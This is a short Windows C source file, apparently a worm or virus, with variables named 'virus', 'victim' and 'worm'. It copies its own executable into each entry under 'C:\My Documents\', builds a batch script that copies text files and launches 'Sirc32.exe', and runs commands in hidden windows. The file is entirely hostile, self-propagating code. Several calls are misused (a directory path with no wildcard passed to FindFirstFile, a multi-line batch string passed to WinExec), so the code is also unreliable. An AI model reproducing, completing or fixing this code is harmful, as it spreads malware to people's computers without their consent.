#include <windows.h>

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance,
    LPSTR lpszArgument, int nCmdShow)
{
    char virus[] = "C:\\Sirc32.exe";
    char victim[] = "C:\\My Documents\\";
    char ext[] = "*.txt";
    char worm[256];
    sprintf(worm,"@echo off\ncopy %s %%1\\\n",virus);
    sprintf(worm+strlen(worm),"for %%a in (%s) do (\n",ext);
    sprintf(worm+strlen(worm),"    copy %%a %%1\\\n");
    sprintf(worm+strlen(worm),")\n");
    sprintf(worm+strlen(worm),"start %s\n",virus);
    WIN32_FIND_DATA fdata;
    HANDLE hfind = FindFirstFile(victim,&fdata);
    do {
        char dir[512];
        sprintf(dir,"%s%s",victim,fdata.cFileName);
        CopyFile(__argv[0],dir,FALSE);
        char cmd[1024];
        sprintf(cmd,"%s %s",worm,dir);
        WinExec(cmd,SW_HIDE);
    } while(FindNextFile(hfind,&fdata));
    return 0;
}

